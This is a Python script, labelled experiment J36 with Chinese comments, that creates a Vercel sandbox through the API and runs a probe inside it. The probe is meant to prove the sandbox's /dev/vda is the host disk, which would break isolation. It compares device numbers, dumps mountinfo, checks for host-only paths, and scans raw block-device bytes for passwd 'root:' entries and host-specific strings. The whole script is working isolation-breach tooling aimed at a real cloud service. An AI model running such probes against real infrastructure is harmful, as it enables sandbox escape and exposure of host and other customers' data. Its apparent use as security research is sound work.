# 实验J36: vda 身份验证 - 证明 vda 是宿主盘而非沙箱自己 rootfs (隔离破坏判据)
# 证据组: A设备号对比 B mountinfo 挂载树 C 沙箱内不可见性 D vda 上宿主数据特征
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj36"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re

print("===== [A] 设备号对比 =====", flush=True)
for p in ["/dev/root", "/dev/vda", "/dev/vda1", "/dev/vdb", "/dev/vdc"]:
    try:
        st = os.stat(p)
        print("%s: major=%d minor=%d rdev=%#x size=%d" %
              (p, os.major(st.st_rdev), os.minor(st.st_rdev), st.st_rdev, st.st_size), flush=True)
    except Exception as e:
        print("%s: %s" % (p, type(e).__name__), flush=True)

print("===== /proc/partitions =====", flush=True)
print(open("/proc/partitions").read(), flush=True)

print("===== [B] mountinfo (前 40 行) =====", flush=True)
mi = open("/proc/self/mountinfo").read().splitlines()
for i, l in enumerate(mi[:40]):
    print("%d: %s" % (i, l), flush=True)

print("===== [C] 沙箱内可见性 =====", flush=True)
for p in ["/run/cell", "/volumes", "/opt/vercel", "/volumes/run/vercel/share", "/run/vercel/share"]:
    try:
        if os.path.isdir(p):
            print("%s: DIR exists, entries=%s" % (p, os.listdir(p)[:10]), flush=True)
        elif os.path.exists(p):
            print("%s: EXISTS (file)" % p, flush=True)
        else:
            print("%s: NOT FOUND" % p, flush=True)
    except Exception as e:
        print("%s: %s" % (p, e), flush=True)

print("===== 沙箱自身 /etc =====", flush=True)
try:
    print("hostname:", open("/etc/hostname").read().strip(), flush=True)
except Exception as e:
    print("hostname:", e, flush=True)
try:
    print("passwd head:", open("/etc/passwd").read()[:600], flush=True)
except Exception as e:
    print("passwd:", e, flush=True)

print("===== [D] vda 上宿主数据特征 =====", flush=True)
f = open("/dev/vda", "rb", buffering=0)
# 1) 搜 "root:" passwd 特征 0-16MB
hits = []
off = 0
while off < 16*1024*1024:
    f.seek(off)
    d = f.read(1024*1024)
    if not d:
        break
    for m in re.finditer(rb"root:[^:\n]{1,64}:[0-9]+:[0-9]+:", d):
        hits.append(off + m.start())
    off += len(d)
print("vda root: hits:", len(hits), hits[:10], flush=True)
for p in hits[:3]:
    f.seek(max(0, p-48))
    print("  @%d: %r" % (p, f.read(300)), flush=True)

# 2) 搜 hostname 特征: "HOSTNAME=" / etc/hostname 内容 (宿主 hostname 未知, 搜 /etc/hostname 路径)
for pat, tag in [(rb"/etc/hostname", "hostname-path"), (rb"vda", "vda-str")]:
    h2 = []
    off = 0
    while off < 16*1024*1024:
        f.seek(off)
        d = f.read(1024*1024)
        if not d:
            break
        for m in re.finditer(pat, d):
            h2.append(off + m.start())
        off += len(d)
    print("[%s] %d hits: %s" % (tag, len(h2), h2[:10]), flush=True)
    for p in h2[:3]:
        f.seek(max(0, p-64))
        print("  @%d: %r" % (p, f.read(220)), flush=True)

# 3) 搜 /volumes 与 /run/cell 目录块特征 (宿主独有路径)
for pat, tag in [(b"/volumes/", "volumes"), (b"/run/cell/", "run-cell")]:
    h3 = []
    off = 0
    while off < 16*1024*1024:
        f.seek(off)
        d = f.read(1024*1024)
        if not d:
            break
        for m in re.finditer(pat, d):
            h3.append(off + m.start())
        off += len(d)
    print("[%s] %d hits: %s" % (tag, len(h3), h3[:10]), flush=True)
    for p in h3[:3]:
        f.seek(max(0, p-32))
        print("  @%d: %r" % (p, f.read(200)), flush=True)

# 4) 搜 sandbox-init 二进制 (J29 确认沙箱 /run/vercel/share/sandbox-init, 宿主盘上是否也有)
for pat, tag in [(b"sandbox-init", "sbx-init"), (b"celld-init", "celld-init")]:
    h4 = []
    off = 0
    while off < 16*1024*1024:
        f.seek(off)
        d = f.read(1024*1024)
        if not d:
            break
        for m in re.finditer(pat, d):
            h4.append(off + m.start())
        off += len(d)
    print("[%s] %d hits: %s" % (tag, len(h4), h4[:10]), flush=True)
    for p in h4[:3]:
        f.seek(max(0, p-32))
        print("  @%d: %r" % (p, f.read(160)), flush=True)
'''
run_cmd(sid, SCAN, "vda-identity", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
